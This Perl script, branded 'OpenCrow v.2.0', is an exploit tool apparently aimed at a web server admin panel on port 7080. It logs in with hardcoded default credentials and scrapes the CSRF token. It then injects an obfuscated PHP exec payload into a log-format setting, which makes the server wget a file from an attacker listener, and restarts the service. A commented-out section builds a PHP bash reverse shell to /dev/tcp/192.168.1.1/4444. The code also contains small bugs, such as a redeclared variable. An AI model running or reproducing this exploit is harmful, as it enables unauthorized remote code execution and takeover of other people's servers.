#!/usr/bin/perl
use strict;
use warnings;
use Path::Tiny;
use Getopt::Long;
use feature qw(say);

say <<help;

 o-o             o-o
o   o           /
|   |o-o o-oo-oO    o-oo   o   o
o   o|  ||-'|  | ||   | | || / || /
 o-o O-o o-oo  o o-oo-o  o   o
     |
     o

+ OpenCrow v.2.0
---------------------------------------------------------------------------

Options :

-l,   --lhost         The listen address
-p,   --lport         The listen port | reverse-shell
-r,   --rhost         The target address range or CIDR identifier
-P,   --rport         The target port (TCP)
-v,   --vport         HTTP server virtual port (this value must be different from LPORT)
-u,   --username      The username to authenticate with.
-x,   --password      The password to authenticate with.

Example : ./suncrow3.sh -l 192.168.1.1 -p 4444 -r 192.168.1.2 -P 7080 -v 5555 -u admin -x admin\n

help

=begin 
# Create Random Shell
my @set = ('0' ..'9', 'A' .. 'F', 'a'.. 'z');
my $rand = join '' => map $set[rand @set], 1 .. 9;
my $random_shell = "$rand".".php";

my $filename = "/tmp/$random_shell";
my $l_payload = <<END;
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.1.1/4444 0>&1'");
END

open(FH, '>', $filename) or die $!;
print FH $l_payload;
close(FH);
print "Create reverse-shell successfully on lhost !\n";

my $new = exec('ls -t /tmp | head -1');

Create Random Log

my $log = "$rand".".txt";

=cut 

# Start Perl HTTPServer 

# Exploit

use HTTP::Cookies;
use LWP::UserAgent;
use IO::Socket::SSL;

my $ua = LWP::UserAgent->new(
    'send_te' => '0',
    'cookie_jar' => HTTP::Cookies->new());

# [ Options ] Debug with Proxy 

$ua->proxy(https => 'http://127.0.0.1:8080');

$ua->ssl_opts(
    SSL_verify_mode => IO::Socket::SSL::SSL_VERIFY_NONE,
    SSL_hostname => '',
    verify_hostname => 0

);
my @_headers = (
    'Accept' => '*/*',
    'Accept-Encoding' => 'gzip,x-gzip,deflate,x-bzip2,bzip2',
    'Accept-Language' => 'en-GB,en-US',
    'Host' => '35.185.189.158:7080',
    'Content-Type'   => 'application/x-www-form-urlencoded'
);

sub _req0(){

    my $req0 = HTTP::Request->new(
    'GET' => 'https://35.185.189.158:7080/service/restart.html',
    [@_headers],
    "{}");
}

sub _req1(){

    my $req = HTTP::Request->new(
    'POST' => 'https://35.185.189.158:7080/login.php',
    [@_headers],
    "userid=admin&pass=admin123");
}

sub _req2(){

    my $req2 = HTTP::Request->new(
    'POST' => 'https://35.185.189.158:7080/config/confMgr.php?m=serv&p=ext',
    [@_headers],
    "{}");

}

my $req1 = $ua->request(_req1,);
my $req2 = $ua->request(_req2,)-> as_string();

my $re=($req2 =~ m/<input type="hidden" name="t" value=""><input type="hidden" name="r" value=""><input type="hidden" name="tk" value="([\d \.]+)">/);

sub _req3(){

    my $req3 = HTTP::Request->new(
    'POST' => 'https://35.185.189.158:7080/config/confMgr.php?m=serv&p=ext',
    [@_headers],
    "useServer=0&fileName=%2Ftmp%2F/haha.txt&pipedLogger=&logFormat=%25s%2C%3C%3Fphp+exec%28%27%2F%3F%3F%3F%2F%3F%3F%3F%2Fw%3Fet+http%3A%2F%2F192.168.1.1%3A4444%2F/tmp/fakfak.txt+-P+%2Fdev%2Fshm%2F/files/%27%29%3F%3E&rollingSize=10M&keepDays=90&bytesLog=&compressArchive=&a=s&m=admin&p=general&t=VH_ACLOG&r=&tk=$1&file_create=");
}

sub _req4(){

    my $req4 = HTTP::Request->new(
    'POST' => 'https://35.185.189.158:7080/service/serviceMgr.php',
    [@_headers],
    "act=restart&actId=&vl=&tk=$1");
}


my $req3 = $ua->request(_req3,);

my $req4 = $ua->request(_req4,);

my $req4 = $ua->request(_req0,);




__END__
